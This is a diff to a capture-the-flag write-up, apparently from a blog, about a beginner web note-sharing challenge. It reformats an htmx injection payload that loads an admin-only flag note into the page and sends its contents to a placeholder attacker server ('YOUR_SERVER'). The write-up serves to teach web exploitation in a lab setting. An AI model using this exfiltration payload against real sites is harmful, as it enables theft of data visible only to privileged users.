@@ -27,20 +27,14 @@ When: **Fri, Oct. 13, 18:00 — Sun, Oct. 15, 18:00 UTC**
 ### TLDR - solution
 
 ```html
-<div 
-    hx-get="/api/note/flag?t=" 
-    hx-trigger="load delay:0.001s"
-    hx-target="#report"
+<div hx-get="/api/note/flag?t=" hx-trigger="load delay:0.001s" hx-target="#report">get flag</div>
+<div
+  hx-get="YOUR_SERVER"
+  hx-on::config-request="event.detail.parameters['flag'] = document.getElementById('report').innerHTML"
+  hx-trigger="load delay:0.8s"
+  hx-target="#report"
 >
-    get flag
-</div>
-<div 
-    hx-get="YOUR_SERVER" 
-    hx-on::config-request="event.detail.parameters['flag'] = document.getElementById('report').innerHTML"
-    hx-trigger="load delay:0.8s"
-    hx-target="#report"
->
-    send flag
+  send flag
 </div>
 ```
 
@@ -50,7 +44,7 @@ When: **Fri, Oct. 13, 18:00 — Sun, Oct. 15, 18:00 UTC**
 
 Challenge was marked as **beginner friendly**. You're greet with a simple web page where you can create and report a `note`.
 
-![landing page](/assets/images/2023-10-15/image-8.png)
+<img src="/assets/images/2023-10-15/image-8.png" alt="Landing page" width="500">
 
 After checking the `get_note` function we knew the flag location (in a `flag` note) and that only admin had an access to it.
 
